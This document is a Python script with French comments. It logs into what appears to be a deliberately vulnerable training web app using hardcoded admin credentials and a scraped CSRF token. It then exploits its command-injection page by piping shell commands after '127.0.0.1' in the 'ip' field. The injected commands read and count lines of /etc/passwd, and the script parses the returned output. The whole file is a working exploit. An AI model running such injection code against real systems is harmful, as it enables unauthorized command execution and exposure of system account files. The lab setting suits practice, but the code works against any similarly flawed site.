#!/usr/bin/env python3
"""
Script pour compter les lignes du fichier /etc/passwd en utilisant l'injection de commandes
"""

import requests
import time
# Import re pour utiliser les expressions régulières
# Utile pour parser et extraire des données de texte avec des patterns spécifiques
import re
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "http://10.0.1.10:5780/website"
LOGIN_URL = f"{BASE_URL}/login.php"
COMMAND_INJECTION_URL = f"{BASE_URL}/vulnerabilities/exec/"
USERNAME = "admin"
PASSWORD = "canyouletmein"



def get_csrf_token(session, url):
    try:
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            if token_input and token_input.get('value'):
                return token_input.get('value')
            else:
                raise ValueError("Token CSRF non trouvé dans la page")
        else:
            raise RuntimeError(f"Erreur lors de la requête: code {response.status_code}")
    except requests.exceptions.RequestException as e:
        raise RuntimeError(f"Erreur de connexion au serveur: {str(e)}")



def login(session):
    print("🔐 Connexion au site DVWS...")
    
    # Récupérer le token CSRF de la page de login
    csrf_token = get_csrf_token(session, LOGIN_URL)
    if not csrf_token:
        print("❌ Impossible de récupérer le token CSRF de login")
        return False
    
    # Headers pour simuler un navigateur
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': LOGIN_URL
    }
    
    # Données de connexion
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'user_token': csrf_token,
        'Login': 'Login'
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            # Vérifier si la connexion a réussi
            if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                print("✅ Connexion réussie !")
                return True
            else:
                print("❌ Échec de la connexion")
                return False
        else:
            print(f"❌ Erreur HTTP lors de la connexion: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur de connexion: {str(e)}")
        return False



def execute_command(session, command):
    """
    Exécute une commande en utilisant l'injection de commandes avec pipe
    """
    print(f"🎯 Exécution de la commande: {command}")
    
    # Headers pour simuler un navigateur
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': COMMAND_INJECTION_URL
    }
    
    # Injection de commande avec pipe
    injected_command = f"127.0.0.1 | {command}"
    
    print(f"🔧 Commande injectée: {injected_command}")
    
    # Données du formulaire
    data = {
        'ip': injected_command,
        'Submit': 'Submit'
    }
    
    try:
        response = session.post(COMMAND_INJECTION_URL, data=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Chercher la sortie de la commande
            output_area = soup.find('div', class_='vulnerable_code_area')
            if output_area:
                output_text = output_area.get_text().strip()
                print(f"📄 Résultat de la commande:")
                print("-" * 50)
                print(output_text)
                print("-" * 50)
                return output_text
            else:
                # Chercher dans d'autres endroits
                all_text_elements = soup.find_all(['div', 'p', 'span', 'td', 'pre'])
                for element in all_text_elements:
                    text = element.get_text().strip()
                    if text and len(text) > 10 and (command in text or 'PING' in text):
                        print(f"📄 Résultat de la commande:")
                        print("-" * 50)
                        print(text)
                        print("-" * 50)
                        return text
                
                print("❌ Aucun résultat trouvé")
                return None
        else:
            print(f"❌ Erreur HTTP: {response.status_code}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur lors de l'exécution: {str(e)}")
        return None



def main():
    """
    Fonction principale pour compter les lignes du fichier /etc/passwd
    """
    print("🚀 Comptage des lignes du fichier /etc/passwd")
    
    # Créer une session persistante
    session = requests.Session()
    
    # Se connecter
    if not login(session):
        print("❌ Impossible de se connecter. Arrêt du script.")
        return
    
    print("=" * 60)
    print("🔍 Analyse du fichier /etc/passwd")
    
    # Commandes à exécuter pour analyser /etc/passwd
    commands = [
        "wc -l /etc/passwd",  # Compter les lignes
        "head -10 /etc/passwd",  # Voir les 10 premières lignes
        "tail -5 /etc/passwd",   # Voir les 5 dernières lignes
        "cat /etc/passwd | wc -l"  # Alternative pour compter les lignes
    ]
    
    results = {}
    
    for i, command in enumerate(commands, 1):
        print(f"\n[{i}/{len(commands)}] Exécution: {command}")
        print("-" * 40)
        
        result = execute_command(session, command)
        results[command] = result
        
        if result:
            # Essayer d'extraire le nombre de lignes si c'est la commande wc
            if "wc -l" in command and result:
                # Chercher un nombre dans le résultat
                numbers = re.findall(r'\d+', result)
                if numbers:
                    print(f"📊 Nombre de lignes trouvé: {numbers[0]}")
        
        time.sleep(1)  # Délai entre les commandes
    
    print("=" * 60)
    print("📊 Résumé des résultats")
    
    # Analyser les résultats
    line_count = None
    
    for command, result in results.items():
        if result and "wc -l" in command:
            # Extraire le nombre de lignes
            numbers = re.findall(r'\d+', result)
            if numbers:
                line_count = int(numbers[0])
                print(f"✅ Nombre de lignes dans /etc/passwd: {line_count}")
                break
    
    if line_count is None:
        print("❌ Impossible de déterminer le nombre de lignes")
        print("🔍 Résultats bruts:")
        for command, result in results.items():
            if result:
                print(f"  {command}: {result}")
    else:
        print(f"\n🎯 RÉPONSE: Le fichier /etc/passwd contient {line_count} lignes")
    
    print("\n💡 Le fichier /etc/passwd contient les attributs utilisateurs de base du système")

if __name__ == "__main__":
    main()
